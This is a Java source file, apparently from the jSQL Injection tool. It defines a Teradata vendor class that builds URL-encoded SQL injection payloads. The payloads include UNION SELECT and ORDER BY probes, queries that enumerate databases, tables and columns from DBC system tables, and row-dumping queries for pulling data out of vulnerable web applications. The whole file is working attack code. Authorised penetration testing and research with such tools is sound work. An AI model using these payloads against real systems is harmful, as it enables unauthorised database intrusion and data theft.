package com.jsql.model.injection.vendor;

import static com.jsql.model.accessible.DataAccess.QTE_SQL;
import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.MediatorModel;
import com.jsql.model.bean.database.Database;
import com.jsql.model.bean.database.Table;
import com.jsql.util.StringUtil;

public class TeradataVendor extends AbstractVendorDefault {

    @Override
    public String getSqlInfos() {
        return
            "select'-'||'"+ SEPARATOR_SQL +"'||" +
            "database||'"+ SEPARATOR_SQL +"'||" +
            "user||" +
            "'"+ TRAIL_SQL +"'" +
            "";
    }

    @Override
    public String getSqlDatabases() {
        return
            "select+'"+ SEPARATOR_SQL +"'||DatabaseName||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'FROM" +
            "(select+DatabaseName,ROW_NUMBER()over(ORDER+BY+DatabaseName)AS+rnum+from+DBC.DBASE)x+where+1=1+{limit}";
    }

    @Override
    public String getSqlTables(Database database) {
        return
            "select+'"+ SEPARATOR_SQL +"'||TVMName||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'FROM" +
            "(select+TVMName,ROW_NUMBER()over(ORDER+BY+TVMName)AS+rnum+from+DBC.TVM+t+inner+join+DBC.DBASE+d+on+t.DatabaseId=d.DatabaseId+where+DatabaseName='" + database + "')x+where+1=1+{limit}";
    }

    @Override
    public String getSqlColumns(Table table) {
        return
            "select+'"+ SEPARATOR_SQL +"'||FieldName||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'FROM" +
            "(select+FieldName,ROW_NUMBER()over(ORDER+BY+FieldName)AS+rnum+from(select+distinct+FieldName+"
            + "from+DBC.TVFIELDS+c+inner+join+DBC.TVM+t+on+c.TableId=t.TVMId+"
            + "+inner+join+DBC.DBASE+d+on+t.DatabaseId=d.DatabaseId+"
            + "where+DatabaseName='" + table.getParent() + "'"
            + "and+TVMName='" + table + "')x)x+where+1=1+"
            + "{limit}"
            ;
    }

    @Override
    public String getSqlRows(String[] columns, Database database, Table table) {
        String formatListColumn = StringUtil.join(columns, ",''))||'%7f'||trim(coalesce(''||");
        formatListColumn = "trim(coalesce(''||" + formatListColumn + ",''))";
        
        return
            "SELECT'"+ SEPARATOR_SQL +"'||r||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from(select+" + formatListColumn + "+r,ROW_NUMBER()over(ORDER+BY+1)AS+rnum+from+" + database + "." + table + ")x+where+1=1+{limit}";
    }

    @Override
    public String getSqlNormal(String sqlQuery, String startPosition) {
        return
            "select+" +
                /**
                 * If reach end of string (SQLii) then NULLIF nullifies the result
                 */
                 "'SQLi'||NULLIF(substr(" +
                 "(" + sqlQuery + ")," +
                 startPosition + "" +
             "),'"+ TRAIL_SQL +"')";
     }

     @Override
     public String getSqlIndicesCapacityCheck(String[] indexes) {
         return
             MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
                 "(select+'SQLi$1'||cast(rpad('%23',1024,'%23')as+varchar(1024)))"
             );
     }

    @Override
    public String getSqlIndices(Integer nbFields) {
        List<String> fields = new ArrayList<>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("trim(''||(1337"+ i +"7330%2b1))");
        }
        return "+union+select+" + StringUtil.join(fields.toArray(new String[fields.size()]), ",") + "FROM(SELECT+1+AS+x)x--+";
    }

    @Override
    public String getSqlOrderBy() {
        return "+order+by+1337--+";
    }

    @Override
    public String getSqlLimit(Integer limitSQLResult) {
        return "and+rnum+BETWEEN+" + (limitSQLResult+1) + "+AND+" + (limitSQLResult+1) + "";
    }
}